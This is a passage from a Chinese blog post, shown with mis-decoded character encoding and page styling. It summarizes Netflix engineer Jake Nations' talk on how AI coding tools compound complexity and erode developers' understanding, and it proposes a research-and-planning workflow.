                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p>Netflixå·¥ç¨‹å¸ˆJake Nationsæ¼”è®²åˆ†äº«:</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV16PB8B1Ep8%2F%3Fspm_id_from%3D333.337.search-card.all.click" target="_blank" title="https://www.bilibili.com/video/BV16PB8B1Ep8/?spm_id_from=333.337.search-card.all.click" ref="nofollow noopener noreferrer">æ— é™è½¯ä»¶å±æœºï¼šNetflix çš„ Jake Nations è§£æ | AI Engineer</a></p>
</blockquote>
<p>æˆ‘å¾—å¦ç™½ä¸€ä»¶äº‹ï¼šæˆ‘æ›¾ç»å‘å¸ƒè¿‡è‡ªå·±å¹¶ä¸å®Œå…¨ç†è§£çš„ä»£ç ã€‚è¿™äº›ä»£ç ç”±AIç”Ÿæˆï¼Œé€šè¿‡äº†æµ‹è¯•ï¼Œä¹ŸæˆåŠŸéƒ¨ç½²äº†ï¼Œä½†æˆ‘å´æ— æ³•è§£é‡Šå®ƒçš„å·¥ä½œåŸç†ã€‚Netflixçš„å·¥ç¨‹å¸ˆJake Nationsåœ¨ä»–çš„æ¼”è®²ä¸­ä»¥è¿™æ ·ä¸€å¥å¦è¯šçš„å¼€åœºç™½ï¼Œæ­ç¤ºäº†å½“ä¸‹è½¯ä»¶å¼€å‘é¢†åŸŸä¸€ä¸ªæ—¥ç›Šä¸¥å³»çš„ç°å®ã€‚ä»–ç”šè‡³æ–­è¨€ï¼šâ€œæˆ‘æ•¢æ‰“èµŒï¼Œåœ¨åº§çš„æ¯ä¸€ä½éƒ½åšè¿‡åŒæ ·çš„äº‹ã€‚â€</p>
<p>è¿™æ­£æ˜¯æˆ‘ä»¬é¢ä¸´çš„æ ¸å¿ƒçŸ›ç›¾ï¼šä¸€æ–¹é¢ï¼ŒAIå·¥å…·ä»¥å‰æ‰€æœªæœ‰çš„é€Ÿåº¦åŠ é€Ÿç€è½¯ä»¶å¼€å‘ï¼Œé‚£äº›ç§¯å‹æ•°å¹´çš„é‡æ„é¡¹ç›®å¦‚ä»Šå¾—ä»¥å®Œæˆï¼›å¦ä¸€æ–¹é¢ï¼Œå®ƒä¹Ÿå‚¬ç”Ÿäº†ä¸€ä¸ªè‡´å‘½çš„æ–°é—®é¢˜â€”â€”æˆ‘ä»¬å¯¹è‡ªå·±éƒ¨ç½²çš„ä»£ç ï¼Œç†è§£æ­£åœ¨è¿…é€Ÿå‡å°‘ã€‚å½“ç³»ç»Ÿåœ¨æ·±å¤œå‘ç”Ÿæ•…éšœæ—¶ï¼Œæˆ‘ä»¬è¿˜èƒ½åƒè¿‡å»ä¸€æ ·è‡ªä¿¡åœ°è¿›è¡Œè°ƒè¯•å—ï¼Ÿ</p>
<p>è¿™ç¯‡æ–‡ç« å°†ä¸ºä½ æç‚¼Jake Nationsæ¼”è®²ä¸­æœ€å…·å†²å‡»åŠ›çš„è§‚ç‚¹ï¼Œå¹¶æ¢è®¨æˆ‘ä»¬è¯¥å¦‚ä½•åœ¨è¿™åœºç”±AIé©±åŠ¨çš„å˜é©ä¸­ï¼Œé‡æ–°å¤ºå›å¯¹ä»£ç å’Œç³»ç»Ÿçš„ä¸»å¯¼æƒã€‚</p>
<hr/>
<h2 data-id="heading-0">1. æˆ‘ä»¬æ‰è¿›äº†â€œç®€å•â€ä¸â€œå®¹æ˜“â€çš„é™·é˜±</h2>
<p>æˆ‘ä»¬é¢ä¸´çš„ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæºäºå¯¹ä¸¤ä¸ªè¯çš„æ ¹æœ¬æ€§æ··æ·†ï¼šæˆ‘ä»¬æŠŠâ€œç®€å•â€ï¼ˆsimpleï¼‰å’Œâ€œå®¹æ˜“â€ï¼ˆeasyï¼‰ææ··äº†ï¼Œè€ŒAIå·¥å…·æ°æ°åˆ©ç”¨äº†è¿™ç§æ··æ·†ã€‚</p>
<p>Clojureè¯­è¨€çš„åˆ›é€ è€…Rich Hickeyæ›¾å¯¹è¿™ä¸¤ä¸ªæ¦‚å¿µåšå‡ºè¿‡ç²¾è¾Ÿçš„åŒºåˆ†ï¼š</p>
<ul>
<li><strong>ç®€å•ï¼ˆSimpleï¼‰</strong> æ„å‘³ç€â€œä¸€è¤¶ã€ä¸€è¾«ã€æ— ç¼ ç»“â€ï¼ˆone fold, one braid, and no entanglementï¼‰ã€‚å®ƒå…³ä¹äº‹ç‰©çš„ç»“æ„ï¼ŒæŒ‡çš„æ˜¯å„ä¸ªéƒ¨åˆ†åªåšä¸€ä»¶äº‹ï¼Œäº’ä¸çº ç¼ ï¼Œä»è€Œä½¿æ•´ä¸ªç³»ç»Ÿæ¸…æ™°ã€å¯è¢«ç†è§£ã€‚</li>
<li><strong>å®¹æ˜“ï¼ˆEasyï¼‰</strong> åˆ™æ„å‘³ç€â€œé‚»è¿‘çš„ã€è§¦æ‰‹å¯åŠçš„ã€ä¸è´¹åŠ›çš„â€ï¼ˆadjacent, within reach, without effortï¼‰ã€‚å®ƒå…³ä¹æˆ‘ä»¬å®Œæˆä»»åŠ¡æ‰€éœ€çš„ç²¾åŠ›ï¼Œæ¯”å¦‚ä»Stack Overflowå¤åˆ¶ç²˜è´´ä»£ç ï¼Œæˆ–æ˜¯å®‰è£…ä¸€ä¸ªâ€œç¥å¥‡â€çš„æ¡†æ¶ã€‚</li>
</ul>
<p>ç®€å•éœ€è¦æ€è€ƒã€è®¾è®¡å’Œè§£è€¦ï¼Œè€Œå®¹æ˜“åˆ™å”¾æ‰‹å¯åŠã€‚AIæ­£æ˜¯é‚£ä¸ªâ€œç»ˆæçš„å®¹æ˜“æŒ‰é’®â€ã€‚å®ƒè®©è·å–ä»£ç çš„è·¯å¾„å˜å¾—å¦‚æ­¤ frictionlessï¼ˆæ— æ‘©æ“¦ï¼‰ï¼Œä»¥è‡³äºæˆ‘ä»¬å¸¸å¸¸å¿½ç•¥äº†é‚£æ¡éœ€è¦æ›´å¤šå‰æœŸæ€è€ƒçš„â€œç®€å•â€ä¹‹è·¯ã€‚</p>
<p>æ¯ä¸€æ¬¡æˆ‘ä»¬é€‰æ‹©å®¹æ˜“ï¼Œéƒ½æ˜¯åœ¨é€‰æ‹©å½“ä¸‹çš„é€Ÿåº¦ï¼Œä»¥åŠæœªæ¥çš„å¤æ‚æ€§ã€‚</p>
<p>è¿™ç§å–èˆä¹‹æ‰€ä»¥å˜å¾—å±é™©ï¼Œæ˜¯å› ä¸ºAIå½»åº•æ‰“ç ´äº†è¿‡å»çš„å¹³è¡¡ã€‚åœ¨è¿‡å»ï¼Œå¤æ‚æ€§æ˜¯åœ¨ä»£ç åº“ä¸­ç¼“æ…¢ç´¯ç§¯çš„ï¼Œæˆ‘ä»¬æœ‰æ—¶é—´å»é‡æ„ã€åæ€å’Œé‡å»ºã€‚è€Œç°åœ¨ï¼ŒAIè®©å¤æ‚æ€§ä»¥æŒ‡æ•°çº§é€Ÿåº¦å¤åˆå¢é•¿ï¼Œç³»ç»Ÿåœ¨æˆ‘ä»¬æ„è¯†åˆ°ä¹‹å‰ï¼Œå°±å·²ç»å˜å¾—éš¾ä»¥ç®¡ç†ã€‚</p>
<hr/>
<h2 data-id="heading-1">2. AIæ˜¯ç›²ç›®çš„ï¼šå®ƒå°†ä½ çš„æŠ€æœ¯å€ºè¯¯è®¤ä¸ºæ˜¯ä¸€ç§æ¨¡å¼</h2>
<p>AIå·¥å…·çš„ä¸€ä¸ªè‡´å‘½ç¼ºé™·æ˜¯ï¼šå®ƒç¼ºä¹è¾¨åˆ«ä¼˜åŠ£çš„ä¸Šä¸‹æ–‡ã€‚åœ¨AIçœ¼é‡Œï¼Œä½ ä»£ç åº“ä¸­çš„æ‰€æœ‰ä»£ç éƒ½æ˜¯éœ€è¦ä¿ç•™å’Œæ¨¡ä»¿çš„â€œæ¨¡å¼â€ï¼Œå®ƒæ— æ³•åŒºåˆ†ä»€ä¹ˆæ˜¯ç²¾å¿ƒè®¾è®¡çš„æ¶æ„ï¼Œä»€ä¹ˆæ˜¯æ—¥ç§¯æœˆç´¯çš„æŠ€æœ¯å€ºã€‚</p>
<p>ã€Šäººæœˆç¥è¯ã€‹çš„ä½œè€…Fred Brooksæ›¾æå‡ºè¿‡ä¸¤ç§å¤æ‚æ€§ï¼š</p>
<ul>
<li><strong>æœ¬è´¨å¤æ‚æ€§ï¼ˆEssential Complexityï¼‰ï¼š</strong> è¿™æ˜¯ä½ è¯•å›¾è§£å†³çš„é—®é¢˜æœ¬èº«å›ºæœ‰çš„éš¾åº¦ã€‚ä¾‹å¦‚ï¼Œâ€œç”¨æˆ·éœ€è¦ä¸ºå•†å“ä»˜æ¬¾â€è¿™ä¸ªä¸šåŠ¡éœ€æ±‚å°±æ˜¯æœ¬è´¨å¤æ‚æ€§ã€‚</li>
<li><strong>æ„å¤–å¤æ‚æ€§ï¼ˆAccidental Complexityï¼‰ï¼š</strong> è¿™æ˜¯æˆ‘ä»¬åœ¨å¼€å‘è¿‡ç¨‹ä¸­é™„åŠ çš„å¤æ‚æ€§ï¼Œæ¯”å¦‚ä¸´æ—¶æ€§çš„å˜é€šæ–¹æ¡ˆã€è¿‡æ—¶çš„æŠ½è±¡å±‚ã€é˜²å¾¡æ€§ä»£ç ç­‰ç­‰ã€‚</li>
</ul>
<p>é—®é¢˜å°±åœ¨äºï¼Œå½“AIåˆ†æä½ çš„ä»£ç åº“æ—¶ï¼Œå®ƒä¼šå°†è¿™ä¸¤ç§å¤æ‚æ€§ä¸€è§†åŒä»ã€‚æŠ€æœ¯å€ºåœ¨å®ƒçœ‹æ¥ä¸æ˜¯â€œå€ºâ€ï¼Œåªæ˜¯æ›´å¤šéœ€è¦è¢«å¤åˆ¶çš„ä»£ç æ¨¡å¼ã€‚</p>
<p>Jake Nationsåˆ†äº«äº†ä¸€ä¸ªNetflixçš„çœŸå®æ¡ˆä¾‹ã€‚ä»–ä»¬æ›¾å°è¯•ä½¿ç”¨AIæ¥é‡æ„ä¸€ä¸ªæ—§çš„æˆæƒç³»ç»Ÿã€‚ç»“æœAIå¤±è´¥äº†ã€‚åŸå› æ˜¯ï¼Œæ—§ä»£ç ä¸­çš„ä¸šåŠ¡é€»è¾‘å’Œæˆæƒé€»è¾‘å·²ç»ç´§å¯†åœ°<strong>äº¤ç»‡åœ¨ä¸€èµ·</strong>ï¼šæƒé™æ£€æŸ¥è¢«ç¼–ç»‡è¿›ä¸šåŠ¡æµç¨‹ï¼Œè§’è‰²å‡è®¾è¢«<strong>å›ºåŒ–åœ¨</strong>æ•°æ®æ¨¡å‹ä¸­ï¼Œæˆæƒè°ƒç”¨æ•£å¸ƒåœ¨æ•°ç™¾ä¸ªæ–‡ä»¶ä¸­ã€‚å½“AIä»£ç†å¼€å§‹é‡æ„æ—¶ï¼Œå®ƒæ ¹æœ¬æ— æ³•ç†æ¸…è¿™ç§çº ç¼ ï¼Œå¸¸å¸¸åœ¨å¤„ç†äº†å‡ ä¸ªæ–‡ä»¶åå°±å› ä¸ºæ— æ³•è§£å¼€ä¾èµ–å…³ç³»è€Œ<strong>é™·å…¥æ­»å¾ªç¯ç„¶åæ”¾å¼ƒ</strong>ã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œå®ƒæœ‰æ—¶ä¼šè¯•å›¾ä¿ç•™æ—§ç³»ç»Ÿçš„é€»è¾‘ï¼Œç”¨æ–°çš„ç³»ç»Ÿé‡æ–°å®ç°æ—§çš„ã€ç³Ÿç³•çš„è®¾è®¡æ¨¡å¼ã€‚</p>
<p>åªæœ‰å…·å¤‡ä¸Šä¸‹æ–‡å’Œç»éªŒçš„äººç±»å·¥ç¨‹å¸ˆï¼Œæ‰èƒ½åˆ†è¾¨å‡ºå“ªäº›æ˜¯å¿…é¡»ä¿ç•™çš„ç²¾åï¼Œå“ªäº›æ˜¯å†å²é—ç•™çš„ç³Ÿç²•ã€‚ä½†è¿™éœ€è¦æˆ‘ä»¬æ…¢ä¸‹æ¥æ€è€ƒâ€”â€”è€ŒAIçš„é€Ÿåº¦æ°æ°åœ¨é˜»æ­¢æˆ‘ä»¬è¿™æ ·åšã€‚</p>
<hr/>
<h2 data-id="heading-2">3. çœŸæ­£çš„å±é™©ï¼šæˆ‘ä»¬æ­£åœ¨ä¸§å¤±è¯†åˆ«é—®é¢˜çš„ç›´è§‰</h2>
<p>æ¯”å‘å¸ƒéš¾ä»¥ç†è§£çš„ä»£ç æ›´å±é™©çš„ï¼Œæ˜¯æˆ‘ä»¬ä½œä¸ºå¼€å‘è€…æ­£åœ¨ä¸§å¤±è¯†åˆ«å¤æ‚æ€§çš„èƒ½åŠ›ã€‚</p>
<p>å·¥ç¨‹å¸ˆé‚£ç§â€œè¿™ä¸ªæ¶æ„å¾ˆå±é™©â€çš„ç›´è§‰ï¼Œå¹¶éä¸ç”Ÿä¿±æ¥ã€‚è¿™ç§æ¨¡å¼è¯†åˆ«èƒ½åŠ›ï¼Œå‡ ä¹å®Œå…¨æ˜¯é€šè¿‡ç»´æŠ¤å’Œè°ƒè¯•å¤±è´¥çš„æƒ¨ç—›ç»å†å»ºç«‹èµ·æ¥çš„ã€‚æ­£å¦‚Nationsæ‰€è¯´ï¼šâ€œå½“æˆ‘èƒ½å‘ç°ä¸€ä¸ªå±é™©çš„æ¶æ„æ—¶ï¼Œé‚£æ˜¯å› ä¸ºæˆ‘å°±æ˜¯é‚£ä¸ª<strong>å‡Œæ™¨ä¸‰ç‚¹</strong>å¤„ç†å®ƒå¼•å‘çš„æ•…éšœçš„äººã€‚â€</p>
<p>ç„¶è€Œï¼Œ<strong>å½“ä½ ä¸å†ç†è§£è‡ªå·±çš„ç³»ç»Ÿæ—¶ï¼Œè¿™ç§ç›´è§‰å°±ä¼šèç¼©</strong>ã€‚æˆ‘ä»¬æŠŠæ€è€ƒå¤–åŒ…ç»™äº†AIï¼Œè·³è¿‡äº†é‚£äº›æœ¬å¯ä»¥ç£¨ç»ƒæˆ‘ä»¬æ¨¡å¼è¯†åˆ«èƒ½åŠ›çš„å…³é”®è¿‡ç¨‹ã€‚</p>
<p>AIåªä¼šç”Ÿæˆä½ è¦æ±‚çš„ä¸œè¥¿ã€‚å®ƒä¸ä¼šç¼–ç ä»è¿‡å»å¤±è´¥ä¸­å¸å–çš„æ•™è®­ã€‚</p>
<p>é•¿æ­¤ä»¥å¾€ï¼Œæˆ‘ä»¬å°†åŸ¹å…»å‡ºä¸€ä»£åªèƒ½å¿«é€Ÿç”Ÿæˆä»£ç ï¼Œå´ç¼ºä¹æ·±åº¦ç†è§£å»ç»´æŠ¤ã€è°ƒè¯•æˆ–å®‰å…¨åœ°æ¼”è¿›å¤æ‚ç³»ç»Ÿçš„å¼€å‘è€…ã€‚è¿™æ‰æ˜¯AIå¸¦æ¥çš„æœ€å¤§é£é™©ã€‚</p>
<hr/>
<h2 data-id="heading-3">4. è§£å†³æ–¹æ¡ˆï¼šç”¨â€œä¸‰é˜¶æ®µæ³•â€é‡æ–°æŒæ¡ä¸»å¯¼æƒ</h2>
<p>é¢å¯¹è¿™ä¸ªå›°å¢ƒï¼Œæˆ‘ä»¬å¹¶éæŸæ‰‹æ— ç­–ã€‚Jake Nationsæå‡ºäº†ä¸€å¥—ä¸AIåä½œçš„â€œä¸‰é˜¶æ®µæ³•â€ã€‚è¿™ä¸ä»…ä»…æ˜¯ä¸€ä¸ªå·¥ä½œæµç¨‹ï¼Œæ›´æ˜¯ä¸€ç§<strong>å°†äººç±»çš„ç†è§£å‹ç¼©æˆå¯å¿«é€Ÿè¯„å®¡çš„å·¥ä»¶</strong>çš„çºªå¾‹ï¼Œæ—¨åœ¨å°†æˆ˜ç•¥æ€è€ƒç‰¢ç‰¢æŒæ¡åœ¨äººç±»æ‰‹ä¸­ï¼ŒåŒæ—¶åˆ©ç”¨AIåŠ é€Ÿæœºæ¢°åŒ–çš„æ‰§è¡Œéƒ¨åˆ†ã€‚</p>
<ul>
<li><strong>ç¬¬ä¸€é˜¶æ®µï¼šç ”ç©¶ (Research)</strong> åœ¨è¿™ä¸€é˜¶æ®µï¼Œæˆ‘ä»¬ä¸ä»…ä»…æ˜¯æŠŠä¸Šä¸‹æ–‡ä¿¡æ¯â€”â€”å¦‚æ¶æ„å›¾ã€è®¾è®¡æ–‡æ¡£â€”â€”æŠ•å–‚ç»™AIã€‚è¿™æ˜¯ä¸€ä¸ª<strong>åå¤æ¢æŸ¥</strong>çš„è¿‡ç¨‹ã€‚æˆ‘ä»¬ä¼šè¿½é—®AIï¼ˆâ€œç¼“å­˜ç­–ç•¥æ˜¯æ€æ ·çš„ï¼Ÿâ€ï¼‰ï¼Œ<strong>çº æ­£</strong>å®ƒçš„åˆ†æï¼Œ<strong>è¡¥å……</strong>å®ƒç¼ºå¤±çš„ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ªè¿‡ç¨‹çš„æœ€ç»ˆäº§å‡ºï¼Œæ˜¯ä¸€ä»½æµ“ç¼©çš„**â€œå•ä¸€ç ”ç©¶æ–‡æ¡£â€**ã€‚å®ƒå°†æ•°å°æ—¶çš„æ¢ç´¢å‹ç¼©æˆå‡ åˆ†é’Ÿçš„é˜…è¯»ï¼Œæ¸…æ™°åœ°å‘ˆç°äº†ç³»ç»Ÿçš„ç°çŠ¶ã€ç»„ä»¶å…³ç³»ä»¥åŠå˜æ›´å¯èƒ½å¸¦æ¥çš„å½±å“ã€‚åœ¨è¿™ä¸€é˜¶æ®µï¼Œè®¾ç«‹ä¸€ä¸ªâ€œäººç±»æ ¡éªŒç‚¹â€è‡³å…³é‡è¦ï¼Œç”±æˆ‘ä»¬æ¥éªŒè¯AIçš„åˆ†ææ˜¯å¦ç¬¦åˆç°å®ã€‚</li>
<li><strong>ç¬¬äºŒé˜¶æ®µï¼šè§„åˆ’ (Planning)</strong> åŸºäºç»è¿‡éªŒè¯çš„ç ”ç©¶æˆæœï¼Œç”±äººç±»ä¸»å¯¼ï¼Œåˆ›å»ºä¸€ä¸ªæå…¶è¯¦å°½çš„å®ç°è®¡åˆ’ã€‚è¿™ä»½è®¡åˆ’éœ€è¦è¯¦å°½åˆ°å¯ä»¥ç§°ä¹‹ä¸º**â€œæŒ‰æ•°å­—å¡«è‰²â€ï¼ˆpaint by numbersï¼‰<strong>çš„çº§åˆ«â€”â€”å³ä½¿æ˜¯å›¢é˜Ÿé‡Œæœ€åˆçº§çš„å·¥ç¨‹å¸ˆï¼Œä¹Ÿèƒ½ç²¾ç¡®åœ°ç…§ç€å®ƒå®Œæˆå·¥ä½œã€‚è¿™ä¸€æ­¥çš„çœŸæ­£é­”åŠ›åœ¨äº</strong>è¯„å®¡é€Ÿåº¦**ï¼šä¸€ä»½è¯¦å°½çš„è®¡åˆ’å¯ä»¥åœ¨å‡ åˆ†é’Ÿå†…å¾—åˆ°éªŒè¯ï¼Œè€Œè¯„å®¡æ•°åƒè¡ŒAIç”Ÿæˆçš„ä»£ç åˆ™å¯èƒ½éœ€è¦æ•°å°æ—¶ç”šè‡³æ•°å¤©ã€‚</li>
